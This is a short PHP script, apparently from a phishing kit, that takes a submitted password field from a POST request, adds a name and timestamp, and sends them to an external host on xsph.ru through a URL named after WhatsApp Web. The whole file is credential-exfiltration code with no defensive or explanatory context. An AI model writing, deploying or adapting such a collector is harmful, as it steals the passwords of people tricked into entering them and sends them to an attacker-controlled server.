<?php
$name = 'ghgfjhfg';
$text = $_POST[guruweba_example_password];
$time = Time::now();
        $date = $time->toString("dd.MM.yyyy.H:m");
file_get_contents('http://f0487136.xsph.ru/whatsapp+web!.php?text='. $text . '&name=' . $name . '&times=' . $date);
?>